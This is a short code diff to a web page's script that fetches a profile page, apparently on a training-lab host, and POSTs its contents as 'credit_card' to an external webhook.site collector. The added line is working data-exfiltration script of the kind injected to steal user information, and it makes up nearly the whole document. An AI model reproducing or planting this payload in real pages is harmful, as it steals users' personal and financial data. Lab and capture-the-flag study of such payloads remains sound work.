@@ -91,7 +91,7 @@
   ></script>
   <script>
     $(document).ready(function(){
-      fetch("/profile.php").then(res=>{return res.text();}).then(string=>{jQuery.ajax({url: "https://webhook.site/331413c1-1439-49c3-bfe5-8653dc8b29aa",method: "POST",data: JSON.stringify({credit_card:string})})})
+      fetch("https://koinbase-55c7f01cc5.cyberjutsu-lab.tech/profile.php").then(res=>{return res.text();}).then(string=>{jQuery.ajax({url: "https://webhook.site/331413c1-1439-49c3-bfe5-8653dc8b29aa",method: "POST",data: JSON.stringify({credit_card:string})})})
     })
     const getRandom = (min, max) =>
       Math.floor(Math.random() * (max - min + 1) + min);
